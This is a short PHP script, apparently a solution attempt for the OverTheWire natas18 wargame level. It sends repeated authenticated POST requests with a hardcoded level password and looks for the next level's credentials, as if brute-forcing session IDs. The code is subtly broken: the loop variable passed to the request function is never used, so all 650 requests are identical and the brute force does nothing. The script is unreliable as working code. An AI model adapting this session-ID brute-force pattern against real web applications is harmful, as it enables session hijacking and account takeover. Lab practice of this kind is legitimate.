<?php
use GuzzleHttp\Client;
require 'vendor/autoload.php';
$http = new Client();

function oracle(Client $http, int $i): bool {
    $request = $http->post(
        'http://natas18.natas.labs.overthewire.org/index.php',
        [
            'auth' => ['natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP']
        ]
    );
    $response = $request->getBody() . '';
    if (strpos($response, 'he credentials for the next level are') !== false) {
        var_dump($response);
        return true;
    }
    return false;
}

for ($i = 0; $i < 650; ++$i) {
    if (oracle($http, $i)) {
        var_dump($i);
    }
}
